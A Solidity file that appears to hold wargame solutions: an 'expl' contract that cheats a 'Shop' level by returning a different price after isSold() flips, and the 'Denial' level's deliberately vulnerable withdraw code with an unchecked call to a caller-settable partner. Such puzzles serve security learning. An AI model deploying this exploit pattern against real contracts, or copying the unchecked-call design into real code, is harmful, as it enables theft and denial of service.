pragma solidity ^0.6;

abstract contract Shop {
    bool public isSold;
	function buy() external virtual;
}

contract expl {
    Shop public lol;
      // same as the Elevator challenge
	function pwn() public {
		lol = Shop(0xd822C2B1a3A7118Eea0ECFD37a4470bde93DC523);
		lol.buy();
	}
	function price() external view returns (uint) {
		return lol.isSold() ? 0 : 100;
	}
}

contract Denial {

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
